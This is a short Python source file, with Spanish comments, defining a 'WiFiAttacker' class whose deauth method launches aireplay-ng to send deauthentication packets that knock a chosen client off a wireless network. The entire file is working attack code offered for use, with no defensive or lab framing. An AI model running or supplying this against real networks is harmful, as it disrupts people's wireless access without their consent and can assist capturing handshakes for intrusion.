import subprocess

class WiFiAttacker:
    def deauth(self, target_bssid, client_mac, interface="wlan0mon"):
        # Envía paquetes de desautenticación para desconectar clientes
        cmd = ["sudo", "aireplay-ng", "-0", "10", "-a", target_bssid, "-c", client_mac, interface]
        subprocess.Popen(cmd)
        return f"[!] Ataque Deauth lanzado contra {client_mac}"